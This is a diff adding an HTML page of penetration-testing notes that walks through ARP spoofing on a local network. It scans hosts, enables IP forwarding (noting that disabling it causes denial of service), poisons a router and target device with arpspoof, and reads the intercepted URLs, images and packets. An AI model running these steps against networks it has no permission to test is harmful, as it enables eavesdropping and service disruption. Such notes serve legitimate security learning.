@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ARP Spoofing - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Arp-spoofing - Sniffing traffic", url: "#_top", children: [
+              {title: "Step 1", url: "#step-1" },
+              {title: "Step 2", url: "#step-2" },
+              {title: "Step 3", url: "#step-3" },
+              {title: "Step 4 - Read the traffic", url: "#step-4-read-the-traffic" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../infrastructure_pentest_scanning_networks/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../infrastructure_pentest_scanning_networks/" class="btn btn-xs btn-link">
+        Scanning Networks
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../active_information_gathering/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../active_information_gathering/" class="btn btn-xs btn-link">
+        Active Information Gathering
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="arp-spoofing-sniffing-traffic">Arp-spoofing - Sniffing traffic<a class="headerlink" href="#arp-spoofing-sniffing-traffic" title="Permanent link">#</a></h1>
+<h2 id="step-1">Step 1<a class="headerlink" href="#step-1" title="Permanent link">#</a></h2>
+<p>Run nmap or netdiscover to list the devices on the network.
+<code>netdiscover -r 192.168.1.0/24</code> or whatever network range it is. This is good because it is live, and it updates as soon as new devices connect to the network.</p>
+<pre><code>nmap -vvv 192.168.1.0/24
+</code></pre>
+
+<h2 id="step-2">Step 2<a class="headerlink" href="#step-2" title="Permanent link">#</a></h2>
+<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre>
+
+<p>this command is fundamental. Without changing it to <code>1</code>you will only block the traffic, but not forward it. So that will bring down the connection for that person. Denial of service. If you want to do that make sure it is set to 0. If you want to intercept it make sure it is set to 1.</p>
+<h2 id="step-3">Step 3<a class="headerlink" href="#step-3" title="Permanent link">#</a></h2>
+<pre><code>arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105
+</code></pre>
+
+<ul>
+<li><code>-i</code> is the interface flag. In this example we choose the wlan0 interface. Run <code>ifconfig</code> to see which interfaces you have available.</li>
+<li><code>-t</code> the target flag. It specifies your target. The first address is the router, and the second is the specific device you want to target.</li>
+</ul>
+<h2 id="step-4-read-the-traffic">Step 4 - Read the traffic<a class="headerlink" href="#step-4-read-the-traffic" title="Permanent link">#</a></h2>
+<p>So now you are intercepting the traffic. You have a few choices how to read it. 
+Use urlsnarf. </p>
+<pre><code>urlsnarf -i wlan0
+</code></pre>
+
+<p>it will output all URLs.</p>
+<pre><code>driftnet -i wlan0
+</code></pre>
+
+<p>Driftnet is pretty cool. It let's you see all the images that is loaded in the targets browser in real time. Not very useful, but kind of cool.
+ - wireshark. Just open wireshark and select the interface and start capturing.
+ - Tcpdump. Also awesome.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../infrastructure_pentest_scanning_networks/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../infrastructure_pentest_scanning_networks/" class="btn btn-xs btn-link">
+        Scanning Networks
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../active_information_gathering/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../active_information_gathering/" class="btn btn-xs btn-link">
+        Active Information Gathering
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_internal_network/arp-spoofing.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
